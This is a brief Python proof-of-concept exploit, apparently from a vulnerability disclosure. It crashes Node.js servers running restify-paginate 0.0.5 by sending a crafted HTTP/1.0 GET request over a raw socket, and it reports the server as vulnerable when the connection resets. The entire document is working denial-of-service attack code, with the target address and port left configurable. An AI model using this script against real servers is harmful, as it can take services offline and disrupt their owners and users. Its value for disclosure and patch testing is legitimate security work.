#!/usr/bin/env python3
# PoC: Crash restify-paginate 0.0.5 Node.js servers
# under linux:      python3 ./proof-of-concept.py
# under windows:    python.exe .\proof-of-concept.py
import socket

target_ip = "127.0.0.1"
target_port = 8888

# handle large responses
def recvall(sock):
    BUFF_SIZE = 4096 # 4 KiB
    data = b''
    while True:
        part = sock.recv(BUFF_SIZE)
        if not part: # no more data
            break
        data += part
    return data

req = "GET / HTTP/1.0\r\n"
req += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
req += "Connection: close\r\n"
req += "\r\n"
payload = req.encode()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

print("[#] Proof of Concept - Crash restify-paginate server")
print("[#] Target: {}:{}".format(target_ip, target_port))

try:
    print("[*] Sending HTTP request...")
    s.send(payload)
    response = recvall(s).decode()
    print("[-] Server not vulnerable! Response follows:")
    print(response)
except ConnectionResetError as conres:
    print("[+] Socket died as expected. Server appears to be vulnerable!")
